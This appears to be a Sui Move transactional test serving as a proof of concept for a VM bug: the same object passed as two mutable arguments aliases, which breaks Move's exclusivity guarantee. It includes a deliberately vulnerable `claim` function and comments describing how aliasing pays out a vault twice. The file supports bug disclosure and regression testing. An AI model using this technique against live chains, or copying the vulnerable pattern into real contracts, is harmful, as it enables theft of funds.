// Copyright (c) Mysten Labs, Inc.
// SPDX-License-Identifier: Apache-2.0

// PoC: the new VM (execution v4 / protocol 118) accepts a Move call that passes
// the SAME input object as two distinct `&mut` arguments. Move guarantees that
// two `&mut` references passed to a function are non-aliasing/exclusive; the
// classic executor enforces this at the PTB layer ("mutable borrowing requires
// unique usage" -> InvalidValueUsage). The static executor's memory-safety pass
// does not, so aliased mutable references reach execution.

//# init --addresses ex=0x0 --accounts A

//# publish
module ex::alias {
    use sui::sui::SUI;
    use sui::coin::{Self, Coin};
    use sui::balance::{Self, Balance};

    public struct Box has key, store {
        id: UID,
        v: u64,
    }

    public struct Vault has key {
        id: UID,
        funds: Balance<SUI>,
    }

    public fun make(ctx: &mut TxContext) {
        transfer::public_transfer(
            Box { id: object::new(ctx), v: 100 },
            ctx.sender(),
        )
    }

    // Move guarantees `a` and `b` are distinct, non-aliasing mutable references.
    // Writing 1 through `a` then 2 through `b` must therefore leave `*a == 1`.
    // If the two references alias the same object, `a.v` becomes 2 and the
    // assertion aborts (code 42) -- proving the exclusivity guarantee is broken.
    public fun break_exclusivity(a: &mut Box, b: &mut Box) {
        a.v = 1;
        b.v = 2;
        assert!(a.v == 1, 42);
    }

    // A vault funded by an honest party.
    public fun found(c: Coin<SUI>, ctx: &mut TxContext) {
        transfer::share_object(Vault { id: object::new(ctx), funds: coin::into_balance(c) })
    }

    // A protocol operation that pays out the COMBINED value of two mutable
    // "receipt" coins the caller presents. It is entitled to assume `r1` and
    // `r2` are distinct (Move's `&mut` exclusivity). With aliasing, the caller
    // presents one coin as both and is paid twice its value from the vault.
    public fun claim(
        vault: &mut Vault,
        r1: &mut Coin<SUI>,
        r2: &mut Coin<SUI>,
        ctx: &mut TxContext,
    ): Coin<SUI> {
        let amount = coin::value(r1) + coin::value(r2);
        coin::from_balance(balance::split(&mut vault.funds, amount), ctx)
    }
}

//# run ex::alias::make --sender A

//# view-object 3,0

// Demonstration 1: pass the same object as both `&mut` arguments.
// On the classic executor this is rejected (InvalidValueUsage).
// On the new VM it is accepted and executes; the aliasing makes `a.v == 2`,
// so the in-Move assertion aborts with code 42 -- proving the two `&mut`
// references alias the same object.
//# programmable --sender A --inputs object(3,0)
//> ex::alias::break_exclusivity(Input(0), Input(0))

// Demonstration 2: fund theft via aliased mutable references.
// Fund a vault with 1000, then present a single 100-value coin as BOTH
// receipts. `claim` pays out 100 + 100 = 200 from the vault for a coin worth
// 100 that is left untouched.
//# programmable --sender A --inputs 1000000000
//> 0: SplitCoins(Gas, [Input(0)]);
//> 1: ex::alias::found(Result(0))

//# view-object 6,0
